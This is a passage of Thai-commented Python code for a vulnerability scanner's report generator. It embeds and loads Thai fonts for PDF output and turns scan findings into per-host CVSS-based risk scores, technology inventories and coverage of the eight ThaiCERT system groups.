ACAAAAHgABAB4ABwAQACIANABGAFgAagB8AAAAAgEPAAAAAgAAAB8AAQAfAAAAAgEQAAAAAgAAACAAAQAgAAAAAgERAAAAAgAAACEAAQAhAAAAAgESAAAAAgAAACIAAQAiAAAAAgETAAAAAgAAACMAAQAjAAAAAgEUAAAAAgAAACQAAQAkAAAAAgEVAAAAAgAAACUAAQAlAAIAGgAqACoAdgAHAAAAAAB+AJAAAAC4AAAAAgACAP8A/wAAAQ8BFgABAAIADADLAMsABADNAPoAAQD9AP0ABAD/AP8AAgEAAQMABAEPAQ8ABQEQARQAAwEVARYABQFFAUYAAQFQAVQABgFVAVUAAQFkAWYABgABAAAAAQAAAAEABAABAAEAAQAAAAEAAAAOAAIABgAaAAEAAQACAAIAAAACAAAADwABABAAAQABAAEAAAABAAAAEQAEAAoAGAAmADQAAQAEAAEAAAABAAAAEgABAAMAAQAAAAEAAAASAAEABQABAAAAAQAAABIAAQAGAAEAAAABAAAAEgABAAgAAQAOAAEAAQEGAAcAEAAiADQARgBYAGoAfAAAAAIBDwAAAAIAAAAfAAEAHwAAAAIBUAAAAAIAAAAgAAEAIAAAAAIBUQAAAAIAAAAhAAEAIQAAAAIBUgAAAAIAAAAiAAEAIgAAAAIBUwAAAAIAAAAjAAEAIwAAAAIBVAAAAAIAAAAkAAEAJAAAAAIBFQAAAAIAAAAlAAEAJQABAAwAAwAWACwAQgABAAMBBAEFAQYAAQAEAAAAAgDMAAAAAgAAACwAAQAsAAEABAAAAAIAzAAAAAIAAAAtAAEALQABAAQAAAACAMwAAAACAAAALgABAC4AAgAKAAIBVQFGAAEAAgDZANwAAQAOAAEACAACARUA/gABAAEA/wABAC4ABQAQABYAHAAiACgAAgEVARAAAgEVAREAAgEVARIAAgEVARMAAgEVARQAAgABARABFAAAAAEABv//AAEAAQD/AAEABgBAAAIAAQEQARQAAAACAAwAAwFlAWQBZgABAAMBDwEVARYAAgAKAAIBUAEEAAEAAgEEARAAAgAKAAIBUQEEAAEAAgEEAREAAgAKAAIBUgEEAAEAAgEEARIAAgAKAAIBUwEEAAEAAgEEARMAAgAKAAIBVAEEAAEAAgEEARQAAgAKAAIBFQEEAAEAAgEEARUAAgAKAAIBUAEFAAEAAgEFARAAAgAKAAIBUQEFAAEAAgEFAREAAgAKAAIBUgEFAAEAAgEFARIAAgAKAAIBUwEFAAEAAgEFARMAAgAKAAIBVAEFAAEAAgEFARQAAgAKAAIBFQEFAAEAAgEFARUAAgAKAAIBDwEGAAEAAgEGAQ8AAgAMAAMBUAEGAQYAAQADAQYBEAFQAAIADAADAVEBBgEGAAEAAwEGAREBUQACAAwAAwFSAQYBBgABAAMBBgESAVIAAgAMAAMBUwEGAQYAAQADAQYBEwFTAAIADAADAVQBBgEGAAEAAwEGARQBVAACAAoAAgEVAQYAAQACAQYBFQACAAoAAgEQAMsAAQACAMsBEAACAAoAAgERAMsAAQACAMsBEQACAAoAAgESAMsAAQACAMsBEgACAAoAAgETAMsAAQACAMsBEwACAAoAAgEGAQQAAQACAQQBBgACAAoAAgEGAQUAAQACAQUBBgACAAoAAgEEAMwAAQACAMwBBAACAAoAAgEFAMwAAQACAMwBBQACAAoAAgEGAMwAAQACAMwBBgACAAoAAgEPAMwAAQACAMwBDwACAAoAAgEQAMwAAQACAMwBEAACAAoAAgERAMwAAQACAMwBEQACAAoAAgESAMwAAQACAMwBEgACAAoAAgETAMwAAQACAMwBEwACAAoAAgEUAMwAAQACAMwBFA=="
_EMB_CACHE = {}


def _embedded_font(bold=False):
    """เขียนฟอนต์ที่ฝังไว้ลงไฟล์ชั่วคราวแล้วคืน path (แคชไว้) — None ถ้าไม่มีฟอนต์ฝัง"""
    import base64 as _b64
    import tempfile
    key = "bold" if bold else "reg"
    if key in _EMB_CACHE and os.path.exists(_EMB_CACHE[key]):
        return _EMB_CACHE[key]
    b64 = _EMBEDDED_FONT_BOLD_B64 if bold else _EMBEDDED_FONT_B64
    if not b64 or b64.startswith("@@"):
        return None
    try:
        data = _b64.b64decode(b64)
        p = os.path.join(tempfile.gettempdir(), f"rmut_embed_{key}.ttf")
        if not (os.path.exists(p) and os.path.getsize(p) == len(data)):
            with open(p, "wb") as fh:
                fh.write(data)
        _EMB_CACHE[key] = p
        return p
    except Exception:
        return None


def _find_font():
    """คืนฟอนต์ไทยสำหรับเรนเดอร์: ฝังมากับโปรแกรมก่อน แล้วค่อยหาในเครื่อง
    หลีกเลี่ยงฟอนต์ AAT ของ macOS (Thonburi ฯลฯ) ที่ทำให้สระ/วรรณยุกต์ลอยใน PDF"""
    import glob
    emb = _embedded_font()
    if emb:
        return emb
    cands = [
        # ฟอนต์ OpenType ที่ ReportLab เรนเดอร์ไทยถูกต้อง (เรียงตามความนิยม/ความสวย)
        "/Library/Fonts/TH Sarabun New.ttf",
        os.path.expanduser("~/Library/Fonts/TH Sarabun New.ttf"),
        "/Library/Fonts/Sarabun-Regular.ttf",
        "/usr/share/fonts/truetype/noto/NotoSansThai-Regular.ttf",
        "/usr/share/fonts/opentype/noto/NotoSansThai-Regular.ttf",
        "/usr/share/fonts/truetype/tlwg/Garuda.ttf",
        "/usr/share/fonts/truetype/tlwg/Sarabun.ttf",
        "/usr/share/fonts/opentype/tlwg/Garuda.otf",
        "/usr/share/fonts/opentype/tlwg/Loma.otf",
        "C:\\Windows\\Fonts\\Leelawadee UI.ttf",
        "C:\\Windows\\Fonts\\tahoma.ttf",
    ]
    for p in cands:
        if os.path.exists(p):
            return p
    patterns = [
        "/usr/share/fonts/**/Sarabun*.*", "/usr/share/fonts/**/Garuda*.*",
        "/usr/share/fonts/**/NotoSansThai*.*",
        "/usr/share/fonts/**/tlwg/*.otf", "/usr/share/fonts/**/tlwg/*.ttf",
        "/usr/share/fonts/**/*hai*.ttf", "/usr/share/fonts/**/*hai*.otf",
    ]
    for pat in patterns:
        hits = glob.glob(pat, recursive=True)
        if hits:
            return sorted(hits)[0]
    return None


def _ensure_pdf_ttf(path):
    """ReportLab ฝังได้เฉพาะ TrueType — ถ้าได้ฟอนต์ .otf (CFF) ให้แปลงเป็น .ttf อัตโนมัติ
    (ต้องมี fonttools) แล้วแคชไว้; คืน path ที่ ReportLab ใช้ได้ หรือ None ถ้าแปลงไม่ได้"""
    if not path:
        return None
    low = path.lower()
    if low.endswith((".ttf", ".ttc")):
        return path
    if not low.endswith(".otf"):
        return path
    try:
        import tempfile
        cache = Path(tempfile.gettempdir()) / ("rmut_" + safe_name(Path(path).stem) + ".ttf")
        if cache.exists() and cache.stat().st_size > 0:
            return str(cache)
        from fontTools.ttLib import TTFont as _FT, newTable
        from fontTools.pens.cu2quPen import Cu2QuPen
        from fontTools.pens.ttGlyphPen import TTGlyphPen
        f = _FT(path)
        gs = f.getGlyphSet(); order = f.getGlyphOrder(); upm = f["head"].unitsPerEm
        glyf = newTable("glyf"); glyf.glyphOrder = order; glyf.glyphs = {}
        for n in order:
            pen = TTGlyphPen(gs); cu = Cu2QuPen(pen, 1.0 * upm / 1000.0, reverse_direction=True)
            try:
                gs[n].draw(cu)
            except Exception:
                pass
            glyf.glyphs[n] = pen.glyph()
        for t in ("CFF ", "CFF2", "VORG", "FFTM"):
            if t in f:
                del f[t]
        f["glyf"] = glyf
        loca = newTable("loca"); loca.set([]); f["loca"] = loca
        mp = newTable("maxp"); mp.tableVersion = 0x00010000; mp.numGlyphs = len(order); mp.maxZones = 1
        for a in ("maxPoints", "maxContours", "maxCompositePoints", "maxCompositeContours",
                  "maxTwilightPoints", "maxStorage", "maxFunctionDefs", "maxInstructionDefs",
                  "maxStackElements", "maxSizeOfInstructions", "maxComponentElements", "maxComponentDepth"):
            setattr(mp, a, 0)
        f["maxp"] = mp
        f["head"].indexToLocFormat = 0
        if "post" in f:
            f["post"].formatType = 3.0
        f.sfntVersion = "\x00\x01\x00\x00"
        f.save(str(cache))
        return str(cache)
    except Exception:
        return None


def _register_font(path):
    if not path:
        return "Helvetica"
    orig = path
    reg_path = _ensure_pdf_ttf(path)
    if not reg_path:
        print("  ⚠ ฟอนต์ไทยที่พบเป็นชนิด OTF และแปลงไม่ได้ (ลง fonttools เพื่อรองรับ) — ใช้ฟอนต์สำรอง")
        return "Helvetica"
    try:
        if reg_path.lower().endswith(".ttc"):
            pdfmetrics.registerFont(TTFont("Thai", reg_path, subfontIndex=0))
        else:
            pdfmetrics.registerFont(TTFont("Thai", reg_path))
        # ลงทะเบียนตัวหนา: ถ้าตัวปกติมาจากฟอนต์ฝัง ให้ใช้ตัวหนาฝังคู่กัน
        # มิฉะนั้นหาไฟล์ Bold ข้างๆ ไฟล์ต้นฉบับ
        try:
            bold = None
            if orig == _embedded_font():
                bold = _embedded_font(bold=True)
            if not bold:
                for suf in ("-Bold", "-bold", "Bold", "-Bld"):
                    cand = re.sub(r"(\.\w+)$", suf + r"\1", orig)
                    if os.path.exists(cand):
                        bold = _ensure_pdf_ttf(cand)
                        break
            if bold:
                pdfmetrics.registerFont(TTFont("Thai-Bold", bold))
                from reportlab.pdfbase.pdfmetrics import registerFontFamily
                registerFontFamily("Thai", normal="Thai", bold="Thai-Bold")
        except Exception:
            pass
        return "Thai"
    except Exception:
        return "Helvetica"


def _setup_mpl_font(path):
    if not (HAS_MPL and path):
        return False
    try:
        font_manager.fontManager.addfont(path)
        prop = font_manager.FontProperties(fname=path)
        plt.rcParams["font.family"] = [prop.get_name()]
        plt.rcParams["axes.unicode_minus"] = False
        return True
    except Exception:
        return False


def _mpl_base_style():
    """สไตล์กราฟกลาง: สะอาด อ่านง่าย ไม่มีเส้นรก"""
    if not HAS_MPL:
        return
    plt.rcParams.update({
        "figure.facecolor": "white",
        "axes.facecolor": "white",
        "axes.edgecolor": PALETTE["grid"],
        "axes.labelcolor": PALETTE["text"],
        "axes.titlecolor": PALETTE["ink"],
        "axes.grid": True,
        "grid.color": PALETTE["grid"],
        "grid.linewidth": 1.0,
        "xtick.color": PALETTE["muted"],
        "ytick.color": PALETTE["muted"],
        "font.size": 12,
        "axes.titlesize": 14,
        "axes.titleweight": "bold",
    })


def _bucket_of(st_val):
    for b, statuses in STATUS_BUCKETS.items():
        if st_val in statuses:
            return b
    return "unknown"


def _sev_key(sev_raw):
    for k in ["critical", "high", "medium", "low"]:
        if k in (sev_raw or "").lower():
            return k.capitalize()
    return "Info"


def _host_label(target):
    """ดึงเฉพาะชื่อโฮสต์จาก URL/target ให้อ่านง่าย"""
    t = (target or "").strip()
    t = re.sub(r"^https?://", "", t).rstrip("/")
    return t or target or "-"


def _host_findings(h):
    """รวมผลช่องโหว่ทั้งหมดของ 1 โฮสต์ (จาก nginx_cves / php_cves / cve_115560)"""
    out = []
    tgt = h.get("target", "")
    for _cve, d in (h.get("nginx_cves") or {}).items():
        out.append({**d, "category": "NGINX", "target": tgt})
    for _cve, d in (h.get("php_cves") or {}).items():
        out.append({**d, "category": "PHP", "target": tgt})
    if h.get("cve_115560"):
        out.append({**h["cve_115560"], "category": "PHP", "target": tgt})
    for _cve, d in (h.get("nodejs_cves") or {}).items():
        out.append({**d, "category": "Node.js", "target": tgt})
    for _cve, d in (h.get("gitlab_cves") or {}).items():
        out.append({**d, "category": "GitLab", "target": tgt})
    for _cve, d in (h.get("app_cves") or {}).items():
        out.append({**d, "category": "App", "target": tgt})
    for _cve, d in (h.get("device_cves") or {}).items():
        out.append({**d, "category": "Device", "target": tgt})
    for _cve, d in (h.get("component_cves") or {}).items():
        out.append({**d, "category": "Component", "target": tgt})
    for _cve, d in (h.get("exposure_cves") or {}).items():
        out.append({**d, "category": "Exposure", "target": tgt})
    for _cve, d in (h.get("framework_cves") or {}).items():
        out.append({**d, "category": "Framework", "target": tgt})
    for _cve, d in (h.get("header_cves") or {}).items():
        out.append({**d, "category": "Headers", "target": tgt})
    for _cve, d in (h.get("tls_cves") or {}).items():
        out.append({**d, "category": "TLS", "target": tgt})
    for _cve, d in (h.get("online_cves") or {}).items():
        out.append({**d, "category": "Online CVE", "target": tgt})
    for _cve, d in (h.get("oskernel_cves") or {}).items():
        out.append({**d, "category": "OS/Kernel", "target": tgt})
    for _cve, d in (h.get("win_php_cves") or {}).items():
        out.append({**d, "category": "PHP", "target": tgt})
    for _cve, d in (h.get("container_cves") or {}).items():
        out.append({**d, "category": "Container", "target": tgt})
    return out


def _host_counts(findings):
    c = {"safe": 0, "vulnerable": 0, "warning": 0, "unknown": 0}
    for r in findings:
        c[_bucket_of(r.get("status", "unknown"))] += 1
    return c


def _risk_from_findings(findings):
    """คำนวณดัชนีความเสี่ยงรายโฮสต์ (0–100) อ้างอิงมาตรฐานสากล CVSS v3.1 (เพดานเต็ม 10.0):
    ดัชนีเสี่ยง = min(100, Σ(CVSS × ตัวคูณสถานะ) ÷ 10 × 100)
    กรณีพบเฉพาะสัญญาณเสี่ยง (warning) โดยยังไม่มีรายการยืนยัน (vulnerable) จะจำกัดเพดานที่ 69
    (ขอบบนของระดับ Medium/Warning 40–69 ตามเกณฑ์ CVSS v3.1)"""
    raw = 0.0
    has_vuln = False
    for r in findings:
        if r.get("status") == "n/a":
            continue
        b = _bucket_of(r.get("status", "unknown"))
        if b == "vulnerable":
            has_vuln = True
        cvss_val = _cvss(r)
        raw += cvss_val * _BUCKET_FACTOR.get(b, 0.0)
    score = int(round(min(100.0, (raw / _RISK_REF_CAP) * 100.0)))
    if not has_vuln and score > 69:
        score = 69
    return score


def _risk_level(score, counts):
    if score >= 70 or counts.get("vulnerable", 0) > 0:
        return "critical"
    if score >= 40 or counts.get("warning", 0) > 0:
        return "warning"
    if counts.get("unknown", 0) > 0:
        return "unknown"
    return "safe"


_RISK_ORDER = {"critical": 0, "warning": 1, "unknown": 2, "safe": 3, "n/a": 4}
_BUCKET_ORDER = {"vulnerable": 0, "warning": 1, "unknown": 2, "safe": 3}


def _os_display(fp):
    """ข้อความ OS พร้อมที่มา/ความเชื่อมั่น (เช่น 'Windows [TTL 115] (TTL heuristic · ต่ำ)')"""
    txt = fp.get("os_version") or (fp.get("os") if fp.get("os") not in (None, "Unknown") else "")
    if txt and fp.get("os_source"):
        txt += f" ({fp['os_source']} · {fp.get('os_confidence', '')})"
    return txt or ""


def _tech_inventory(fp, cms_info, findings):
    """รวมเทคโนโลยีที่ตรวจพบทุกชั้นเป็นตารางเดียว: [tech, version, status, #CVE, maxSeverity]
    status บอก EOL/ปลอม/ตรวจสอบ; #CVE/severity นับจาก findings ที่กระทบจริง"""
    app = (cms_info or {}).get("app") or {}
    impact = [f for f in findings if _bucket_of(f.get("status")) in ("vulnerable", "warning")]

    def _match(cats=(), kw=()):
        fs = [f for f in impact if (f.get("category") in cats) or
              any(k and k.lower() in (f.get("name", "") + " " + f.get("reason", "")).lower() for k in kw)]
        if not fs:
            return 0, ""
        sev = max((f.get("severity", "") for f in fs),
                  key=lambda s: _SEV_WEIGHT.get((s or "").split("(")[0].strip(), 0.0))
        return len(fs), sev

    rows = []

    def add(tech, ver, status, cats=(), kw=()):
        if not ver:
            return
        n, sev = _match(cats, kw)
        rows.append([tech, ver, status, (str(n) if n else "—"), (sev if n else "—")])

    if _os_display(fp):
        add("ระบบปฏิบัติการ (OS)", _os_display(fp), "—")
    if fp.get("server_family", "Unknown") != "Unknown":
        add(fp["server_family"], fp.get("server_version", "") or "(เวอร์ชันไม่เปิดเผย)", "—",
            cats=("NGINX",), kw=(fp["server_family"],))
    for k, v in (fp.get("modules") or {}).items():
        add(k, v, "—", kw=(k,))
    if fp.get("php_versions"):
        eol = any(f.get("cve") == "UNSUPPORTED-PHP" for f in findings)
        add("PHP", ", ".join(fp["php_versions"]),
            ("🔴 EOL — หยุดรับแพตช์" if eol else "ตรวจรุ่นล่าสุด"), cats=("PHP",))
    if fp.get("nodejs_versions"):
        add("Node.js", ", ".join(fp["nodejs_versions"]), "—", cats=("Node.js",))
    if app.get("product"):
        appf = next((f for f in findings if f.get("cve") == "APP-" + app["product"]), None)
        st = "ตรวจรุ่นล่าสุด"
        if appf:
            nm = appf.get("name", "")
            if "ปลอม" in nm:
                st = "⚠️ เวอร์ชันอาจถูกปลอม"
            elif "เก่า" in nm or appf.get("status") == "vulnerable-version":
                st = "🔴 EOL/รุ่นเก่า"
        add(app["product"], app.get("version_str", "") or "(ไม่ทราบ)", st,
            cats=("App",), kw=(app["product"],))
    if fp.get("device"):
        add(fp["device"], fp.get("device_version", "") or "(firmware ไม่เปิดเผย)",
            "ตรวจ firmware", cats=("Device",), kw=(fp["device"],))
    for c in (fp.get("components") or []):
        add(f"{c['name']} · {c['type']}", c.get("version", "") or "(ไม่ทราบเวอร์ชัน)", "—",
            cats=("Component",), kw=(c["name"],))
    if fp.get("composer_packages"):
        add("แพ็กเกจ composer", f"{len(fp['composer_packages'])} แพ็กเกจ", "เทียบ CVE รายแพ็กเกจ")
    return rows


# ── ThaiCERT / NCSA : 8 กลุ่มระบบที่อาจใช้ PHP (อ้างอิงอินโฟกราฟิก "ตรวจสอบ PHP ให้ครบ 8 กลุ่มระบบ") ──
# cap     = เพดานความสามารถ "ตรวจจากภายนอกแบบไม่ล็อกอิน" (remote unauthenticated) โดยประมาณ
# cap_lan = เพดานเมื่อสแกนจาก "เครือข่ายภายใน" (LAN mode: nmap -O/ARP + MAC/OUI + เข้าถึงอุปกรณ์ภายในได้)
#       ทั้งคู่ไม่ใช่ความแม่นของผลลัพธ์รายกรณี — เพดานสูงสุดจริงต้องเข้าถึงระดับโฮสต์ (agent / credential)
THAICERT_GROUPS = [
    {"no": 1, "name": "เว็บไซต์ & ระบบภายในองค์กร (CMS)",
     "ex": "WordPress, Drupal, Joomla, Moodle, Nextcloud", "cap": 88, "cap_lan": 92,
     "note": "ตรวจ CMS + เวอร์ชัน + EOL + ปลอมเวอร์ชัน (WordPress, Drupal, Joomla, Moodle, Nextcloud) และปลั๊กอิน (WP) → CVE ได้ดี"},
    {"no": 2, "name": "ระบบหลังบ้านแอปมือถือ & API (Framework)",
     "ex": "Laravel, Symfony, CodeIgniter, Yii, Slim", "cap": 60, "cap_lan": 68,
     "note": "ตรวจจับ Framework (Laravel, Symfony, CodeIgniter, Yii, Slim) + debug ที่เปิดทิ้ง (Ignition CVE-2021-3129, Profiler, Gii)"},
    {"no": 3, "name": "Hosting Control Panel",
     "ex": "cPanel, Plesk, DirectAdmin, Webmin + โอเพนซอร์ส: Hestia, Vesta, CyberPanel, aaPanel, ISPConfig, CWP",
     "cap": 75, "cap_lan": 85,
     "note": "ระบุแผงควบคุม (รวมโอเพนซอร์ส Hestia/Vesta/CyberPanel/aaPanel/ISPConfig/CWP) + เวอร์ชัน→CVE; "
             "cPanel/DirectAdmin ตรวจจับผ่านพอร์ตและหน้าล็อกอินเฉพาะ"},
    {"no": 4, "name": "ซอฟต์แวร์ & อุปกรณ์สำเร็จรูป (NAS/กล้อง/Network)",
     "ex": "Synology, QNAP, Hikvision, pfSense, FortiGate, MikroTik", "cap": 65, "cap_lan": 88,
     "note": "คลังสัญญาณอุปกรณ์กว้าง (NAS/CCTV/firewall/router) + MAC/OUI (เฉพาะ LAN); จุดอ่อน: firmware ส่วนใหญ่ปิด, ไม่มี ICS/SCADA"},
    {"no": 5, "name": "Container & Docker Image",
     "ex": "Docker, Kubernetes, Traefik, Istio, Podman", "cap": 45, "cap_lan": 55,
     "note": "ตรวจจับชั้น Ingress/Reverse-proxy + ตรวจจับพอร์ตเปิดเผย Docker API (2375) / Registry (5000) / K8s (6443)"},
    {"no": 6, "name": "Windows ที่มี PHP ติดตั้ง",
     "ex": "IIS, XAMPP, WampServer, Laragon", "cap": 70, "cap_lan": 85,
     "note": "ตรวจ IIS/Windows, XAMPP, WampServer, Laragon และเชื่อมโยงความเสี่ยง CVE-2024-4577 (PHP-CGI RCE) อัตโนมัติ"},
    {"no": 7, "name": "ระบบทดสอบ / ระบบเก่า / ระบบสำรอง",
     "ex": "Dev/UAT/Staging, ไฟล์ backup/.git/.env, phpinfo", "cap": 75, "cap_lan": 80,
     "note": "จับไฟล์รั่ว/แบ็กอัป/.git/.env/phpinfo/debug + จำแนกระบบทดสอบ/เก่า/สำรองผ่าน Subdomain (dev/uat/staging/dr) อัตโนมัติ"},
    {"no": 8, "name": "ระบบที่ผู้ให้บริการภายนอกดูแล (Hosting/Cloud)",
     "ex": "Shared/Managed Hosting, Cloud VM, WAF/CDN", "cap": 45, "cap_lan": 50,
     "note": "อนุมานประเภทโฮสต์จาก WAF/CDN + control panel ได้ แต่ 'ใครดูแล/ผู้รับจ้าง' เป็นข้อมูลเชิงองค์กร ตรวจทางเทคนิคไม่ได้"},
]


def _thaicert_coverage(data):
    """จัดสิ่งที่ตรวจพบในสแกนนี้เข้า 8 กลุ่มระบบของ ThaiCERT + เพดานความสามารถของเครื่องมือ
    คืน list[dict]: {no, name, ex, cap, cap_remote, lan, note, hosts(int), items(list[str]),
                     detail:[{host, ip, level, items:[...], cves:[...]}]}
    cap = เพดานที่ใช้จริง (cap_lan ถ้าสแกนจาก LAN, ไม่งั้น cap ภายนอก); lan = True เมื่อตรวจพบบริบท LAN
    detail ใช้สำหรับ drill-down ในแดชบอร์ด HTML (คลิกกลุ่ม → เห็นรายโฮสต์ที่เข้ากลุ่มนั้น)"""
    # ตรวจบริบท LAN: มีโฮสต์ที่เปิดโหมด LAN / เป็น IP ภายใน / มี MAC (เห็นได้เฉพาะ LAN เดียวกัน)
    lan_ctx = any(h.get("reachable") and (h.get("lan") or h.get("mac") or
                                          _is_private_ip(h.get("ip")) is True)
                  for h in data.get("hosts", []))
    g = {x["no"]: {**x, "_hosts": set(), "_items": set(), "_detail": {}} for x in THAICERT_GROUPS}

    def hit(no, host, item="", cves=(), hmeta=None):
        g[no]["_hosts"].add(host)
        if item:
            g[no]["_items"].add(item)
        d = g[no]["_detail"].setdefault(host, {"host": host, "ip": (hmeta or {}).get("ip", ""),
                                                "level": (hmeta or {}).get("level", ""),
                                                "items": set(), "cves": set()})
        if item:
            d["items"].add(item)
        for cv in cves:
            if cv:
                d["cves"].add(cv)

    CMS1 = ("wordpress", "drupal", "joomla", "moodle", "nextcloud")
    FW2 = ("laravel", "symfony", "codeigniter", "yii", "slim")
    CP3 = ("cpanel", "plesk", "directadmin", "webmin", "hestia", "vesta", "cyberpanel",
           "aapanel", "bt-panel", "ispconfig", "ispmanager", "froxlor", "ajenti", "webuzo",
           "centos web panel", "cwp", "cloudpanel", "virtualmin", "keyhelp", "sentora", "zpanel")
    CTR5 = ("traefik", "kubernetes", "k8s", "envoy", "istio", "haproxy", "docker", "xampp")
    for h in data.get("hosts", []):
        if not h.get("reachable"):
            continue
        host = h.get("host", "")
        hm = {"ip": h.get("ip", ""), "level": h.get("level") or h.get("risk_level", "")}
        cms = (h.get("cms") or "").lower()
        server = (h.get("server") or "").lower()
        os_ = (h.get("os") or "").lower()
        waf = (h.get("waf") or "")
        device = (h.get("device") or "")
        dev_l = device.lower()
        stack = " ".join(h.get("stack", []) or []).lower()
        comps = h.get("components", []) or []
        cves = [str(f.get("cve", "")) for f in (h.get("findings", []) or [])]

        def _pfx(*prefixes):
            return [c for c in cves if c.startswith(prefixes)]

        # 1) CMS / เว็บไซต์ภายในองค์กร
        _c1 = next((c for c in CMS1 if c in cms), "")
        _app_cves = _pfx("APP-")
        if _c1 or _app_cves:
            hit(1, host, (h.get("cms", "") or "").strip() if _c1 else "", _app_cves, hm)
        # 2) Framework / API backend
        _f2 = next((c for c in FW2 if c in cms or c in stack), "")
        _fw_cves = _pfx("FRAMEWORK-", "CVE-2021-3129")
        if _f2 or _fw_cves:
            hit(2, host, _f2.title() if _f2 else "debug ที่เปิดทิ้ง", _fw_cves, hm)
        # 3) Hosting Control Panel
        _cp = next((c for c in CP3 if c in dev_l), "")
        if _cp:
            hit(3, host, device, _pfx("DEVICE-"), hm)
        # 4) อุปกรณ์สำเร็จรูป / NAS / กล้อง / network
        _dev_cves = _pfx("DEVICE-")
        if device and not _cp:
            hit(4, host, device, _dev_cves, hm)
        elif _dev_cves:
            hit(4, host, "", _dev_cves, hm)
        if h.get("mac_vendor"):
            hit(4, host, "MAC→" + h["mac_vendor"], (), hm)
        # 5) Container / Docker (ชั้น edge ที่มองเห็น + พอร์ตเปิดเผย)
        _ct = next((c for c in CTR5 if c in stack), "")
        _ctr_cves = _pfx("CONTAINER-")
        if _ct or _ctr_cves:
            hit(5, host, _ct.title() if _ct else "Docker/K8s Exposed", _ctr_cves, hm)
        # 6) Windows + PHP
        _w4577 = [c for c in cves if c == "CVE-2024-4577"]
        if "windows" in os_ or "iis" in server:
            hit(6, host, "Windows/IIS", _w4577, hm)
        if "xampp" in stack:
            hit(6, host, "XAMPP", _w4577, hm)
        if "wampserver" in stack or "wamp" in dev_l:
            hit(6, host, "WampServer", _w4577, hm)
        if "laragon" in stack or "laragon" in dev_l:
            hit(6, host, "Laragon", _w4577, hm)
        # 7) ระบบทดสอบ / เก่า / สำรอง (ไฟล์รั่ว/แบ็กอัป/debug/subdomain)
        _exp_cves = _pfx("EXPOSURE-")
        if _exp_cves:
            hit(7, host, "ไฟล์/แบ็กอัปรั่ว", _exp_cves, hm)
        if _fw_cves:
            hit(7, host, "debug เปิดทิ้ง", _fw_cves, hm)
        if any("phpinfo" in (c.get("name", "") or "").lower() for c in comps):
            hit(7, host, "phpinfo", (), hm)
        _dev_kws = ("dev", "uat", "staging", "stage", "dr", "old", "bak", "backup",
                    "temp", "tmp", "demo", "beta", "qa", "lab", "test", "poc")
        _h_parts = re.split(r"[-.]", host.lower())
        _matched_dev = [k for k in _dev_kws if k in _h_parts]
        if _matched_dev:
            hit(7, host, f"Subdomain: {','.join(_matched_dev)} (ระบบทดสอบ/สำรอง)", (), hm)
        # 8) ผู้ให้บริการภายนอก / Cloud (อนุมานจาก WAF/CDN + shared hosting)
        if waf:
            hit(8, host, waf, (), hm)
        if _cp in ("cpanel", "plesk", "directadmin"):
            hit(8, host, "shared hosting (" + device + ")", (), hm)

    out = []
    for x in THAICERT_GROUPS:
        gg = g[x["no"]]
        detail = []
        for host, d in sorted(gg["_detail"].items()):
            detail.append({"host": d["host"], "ip": d["ip"], "level": d["level"],
                           "items": sorted(d["items"]), "cves": sorted(d["cves"])})
        cap_remote = x["cap"]
        cap_lan = x.get("cap_lan", cap_remote)
        eff = cap_lan if lan_ctx else cap_remote
        out.append({"no": x["no"], "name": x["name"], "ex": x["ex"],
                    "cap": eff, "cap_remote": cap_remote, "cap_lan": cap_lan, "lan": lan_ctx,
                    "note": x["note"], "hosts": len(gg["_hosts"]),
                    "items": sorted(gg["_items"])[:6], "detail": detail})
    return out


def _extract_data(json_data):
    scan_date = json_data.get("scan_time", datetime.now().isoformat())

    def build_host(r, reachable=True):
        lbl = _host_label(r.get("target", ""))
        if not reachable:
            return {"target": r.get("target", ""), "host": lbl, "ip": r.get("ip", ""),
                    "reachable": False, "counts": {"safe": 0, "vulnerable": 0, "warning": 0, "unknown": 0},
                    "risk_score": 0, "risk_level": "n/a", "server": "-", "php": "-",
                    "cms": "-", "lfi": 0, "max_cvss": 0.0, "max_epss": 0.0,
                    "crit_asset": _asset_crit(lbl), "hdr": None, "findings": [], "top": []}
        f = _host_findings(r)
        counts = _host_counts(f)
        score = _risk_from_findings(f)
        fp = r.get("fingerprint", {}) or {}
        risky = sorted([x for x in f if _bucket_of(x.get("status")) != "safe"],
                       key=lambda x: (_BUCKET_ORDER.get(_bucket_of(x.get("status")), 9), -_cvss(x)))
        # CVSS/EPSS สูงสุด: นับเฉพาะรายการที่มีผลกระทบจริง (เสี่ยง/อาจเสี่ยง) — ไม่รวม "ไม่ทราบ"
        # โฮสต์ที่เหลือแต่ "ไม่ทราบ" จะได้ max_cvss=0 → ฝั่งแสดงผลโชว์ "—" แทน 9.8 ที่ชวนสับสน
        _impact = [x for x in f if _bucket_of(x.get("status")) in ("vulnerable", "warning")]
        max_cvss = max([_cvss(x) for x in _impact], default=0.0)
        max_epss = max([_epss(x) for x in _impact], default=0.0)
        _app = (r.get("cms", {}) or {}).get("app") or {}
        if _app.get("product"):
            _cms_disp = f"{_app['product']} {_app.get('version_str', '')}".strip()
        else:
            _cms_disp = (r.get("cms", {}) or {}).get("cms", "-") or "-"
        return {"target": r.get("target", ""), "host": lbl, "ip": r.get("ip", ""),
                "reachable": True, "counts": counts, "risk_score": score,
                "risk_level": _risk_level(score, counts),
                "server": (f"{fp.get('server_family', '?')} {fp.get('server_version', '')}".strip() or "?"),
                "php": ", ".join(fp.get("php_versions", [])) or "-",
                "cms": _cms_disp,
                "os": _os_display(fp),
                "stack": fp.get("stack_layers", []) or [],
                "waf": fp.get("waf") or "",
                "device": (f"{fp['device']} {fp.get('device_version', '')}".strip() if fp.get("device") else ""),
                "components": fp.get("components", []) or [],
                "mac": fp.get("mac", ""), "mac_vendor": fp.get("mac_vendor", ""),
                "lan": fp.get("lan_mode", False),
                "tech": _tech_inventory(fp, r.get("cms"), f),
                "lfi": len(r.get("lfi_findings", []) or []), "max_cvss": max_cvss, "max_epss": max_epss,
                "crit_asset": _asset_crit(lbl), "hdr": _audit_headers(fp),
                "tls_version": fp.get("tls_version"), "cert_days_left": fp.get("cert_days_left"),
                "cert_problem": fp.get("cert_problem", False),
                "findings": f, "top": risky}

    if "results" in json_data:
        results = json_data["results"]
        reachable = [r for r in results if r.get("reachable")]
        all_results, hosts = [], []
        for r in results:
            h = build_host(r, bool(r.get("reachable")))
            hosts.append(h)
            if h["reachable"]:
                all_results.extend(h["findings"])
        if json_data.get("target"):
            target = json_data["target"]
        elif len(results) == 1 and results[0].get("target"):
            target = results[0]["target"]
        elif reachable:
            target = f"{len(reachable)} โฮสต์ที่เข้าถึงได้"
        else:
            target = "ไม่พบโฮสต์ที่เข้าถึงได้"
